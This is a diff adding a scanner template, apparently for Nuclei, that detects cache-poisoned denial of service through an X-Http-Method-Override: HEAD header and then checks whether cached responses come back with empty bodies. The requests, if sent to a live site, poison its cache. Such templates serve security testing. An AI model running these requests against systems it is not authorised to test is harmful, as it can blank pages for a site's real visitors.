@@ -1,0 +1,33 @@
+id: Method_Override_CPDoS
+info:
+  name: wordPressCacheP
+  author: raff
+  severity: high
+  tags: cache
+
+
+http:
+  - raw:
+      - |
+        GET {{BaseURL}}?cachetest11=H1raff11 HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET {{BaseURL}}?cachetest2=H1raff2 HTTP/1.1
+        Host: {{Hostname}}
+        X-Http-Method-Override: HEAD
+      - |
+        GET {{BaseURL}}?cachetest2=H1raff2 HTTP/1.1
+        Host: {{Hostname}}
+        X-Http-Method-Override: HEAD
+      - |
+        GET {{BaseURL}}?cachetest2=H1raff2 HTTP/1.1
+        Host: {{Hostname}}
+    req-condition: true
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == status_code_2  && status_code_3 == status_code_2'
+          - 'len(body_1)>1 && len(body_3) == 0 && len(body_4) == 0'
+        condition: and
